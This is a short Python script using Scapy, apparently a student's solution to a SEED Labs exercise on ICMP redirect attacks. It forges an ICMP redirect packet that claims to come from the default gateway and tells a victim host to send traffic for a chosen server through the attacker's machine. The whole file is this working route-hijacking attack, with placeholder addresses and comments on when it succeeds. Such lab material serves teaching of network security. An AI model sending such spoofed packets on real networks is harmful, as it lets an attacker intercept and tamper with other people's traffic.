"""
SEED LABS -  ICMP redirect

Nati Aharoni
"""


from scapy.all import *

user_ip = "ENTER the IP address of the USER"
server_ip = "ENTER the IP address of the SERVER"
def_gatewat_ip = "ENTER the IP address of the GATEWAY"
att_ip = "ENTER the IP address of the ATTACKER"


ip = IP(src=def_gatewat_ip, dst=user_ip)

# Type 5 in ICMP dtands for redirect message and code 1 stands for host route.
icmp = ICMP(type=5, code=1)

# Setting the new default gateway to be the Attacker's IP
# Setting this adress to be a mmachine outside of the LAN will work,
# but it won't work for a machine that's offline,
# because the user pings this address to check if it's available, before it changes the default gateway.
icmp.gw = att_ip

ip2 = IP(src=user_ip, dst = server_ip)
pkt = ip/icmp/ip2/UDP()
send(pkt)

pkt.show()




